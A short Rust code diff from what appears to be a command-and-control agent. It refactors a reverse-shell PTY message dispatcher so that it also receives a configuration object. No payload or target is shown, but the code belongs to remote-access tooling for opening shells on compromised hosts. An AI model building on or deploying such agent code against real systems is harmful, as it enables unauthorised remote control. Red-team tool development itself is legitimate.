@@ -1,6 +1,9 @@
 use super::Dispatcher;
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
+use pb::{
+    c2::{ReverseShellMessageKind, ReverseShellRequest},
+    config::Config,
+};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 #[cfg(not(target_os = "windows"))]
 use std::path::Path;
@@ -18,7 +21,7 @@ pub struct ReverseShellPTYMessage {
 }
 
 impl Dispatcher for ReverseShellPTYMessage {
-    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
+    async fn dispatch(self, transport: &mut impl Transport, _cfg: Config) -> Result<()> {
         let task_id = self.id;
 
         #[cfg(debug_assertions)]
